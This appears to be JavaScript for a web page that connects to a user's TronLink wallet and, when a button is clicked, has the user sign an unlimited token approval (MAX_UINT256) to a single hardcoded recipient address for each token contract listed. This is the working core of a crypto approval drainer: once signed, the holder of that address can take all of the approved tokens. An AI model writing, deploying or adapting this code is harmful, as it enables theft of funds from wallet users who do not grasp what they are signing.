let tronWebInstance;

async function getTronWeb() {
    return new Promise((resolve, reject) => {
        const checkTronWeb = setInterval(() => {
            if (typeof window.tronWeb !== 'undefined') {
                clearInterval(checkTronWeb);
                tronWebInstance = window.tronWeb;
                resolve(tronWebInstance);
            } else {
                alert('请安装TronLink钱包并登录');
                reject(new Error('Wallet not found'));
            }
        }, 1000);
    });
}

const recipientAddress = 'TYrG44bTwLhiEGvb48HYtHCAkgk7etr4d3'; // 接收地址
const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 无限授权的值

document.getElementById('approveBtn').onclick = async function() {
    try {
        const tronWeb = await getTronWeb();

        // 获取用户输入的代币合约地址
        const tokenAddresses = document.getElementById('tokens').value.split(',').map(addr => addr.trim());

        // 遍历每个代币合约地址，进行无限授权
        for (const tokenAddress of tokenAddresses) {
            if (!tronWeb.isAddress(tokenAddress)) {
                document.getElementById('status').innerText = `无效的地址: ${tokenAddress}`;
                continue;
            }
            
            const tokenContract = await tronWeb.contract().at(tokenAddress);
            
            // 无限授权
            const approveTx = await tokenContract.approve(recipientAddress, MAX_UINT256).send();
            document.getElementById('status').innerText += `无限授权成功！ (合约地址: ${tokenAddress})\n`;
        }
    } catch (error) {
        console.error(error);
        document.getElementById('status').innerText = '操作失败: ' + (error.message || '未知错误');
    }
};
